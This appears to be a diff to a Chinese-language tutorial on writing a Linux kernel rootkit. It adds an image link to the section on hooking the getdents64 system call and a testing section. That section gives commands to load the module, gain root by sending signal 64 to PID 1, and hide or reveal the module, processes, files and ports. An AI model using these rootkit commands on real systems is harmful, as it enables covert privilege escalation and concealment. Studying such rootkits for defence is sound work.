@@ -75,7 +75,7 @@ module_exit(example_exit);
 
 进程通过系统调用使用内核服务。系统调用会进入内核，让内核执行服务然后返回，关于系统调用的更多信息，可以使用`man -k syscall`获取。如下图所示，hook可以劫持正常的系统调用，让内核执行我们自行设计的函数，从而实现我们自己想要的功能
 
-![hook]()
+![hook](https://raw.githubusercontent.com/LaPhilosophie/hello-rootkit/main/image/hook.png)
 
 比如，当用户使用ls命令列出该目录下所有文件的时候，本质上是使用了`getdents64`系统调用，如果我们将`getdents64`的**地址替换**为我们自己构造的函数`hook_getdents64` ，即可劫持系统调用流程。因此，只要我们分析清楚了某一个shell命令底层所执行的系统调用，并成功对其进行hook，那么就可以成功实现rootkit的种种目的
 
@@ -331,6 +331,56 @@ struct linux_dirent64 {
 ## 端口隐藏
 
 
+
+## 功能测试
+
+模块编译、安装、卸载：
+
+```c
+sudo make 
+
+sudo insmod rootkit.ko
+   
+sudo rmmod rootkit
+```
+
+提权：
+
+```
+id
+
+kill -64 1
+
+id
+```
+
+模块隐藏与恢复
+
+```
+echo hidemodule >/dev/null
+echo showmodule >/dev/null
+```
+
+进程隐藏与恢复
+
+```
+echo hideprocess [PID] >/dev/null
+echo showprocess [PID] >/dev/null
+```
+
+**文件隐藏与回复**
+
+```
+echo hidefile [filename] >/dev/null
+echo showfile [filename] >/dev/null
+```
+
+**端口隐藏与回复**
+
+```
+echo hideport [port] >/dev/null
+echo showport [port] >/dev/null
+```
 
 # 参考资料
 
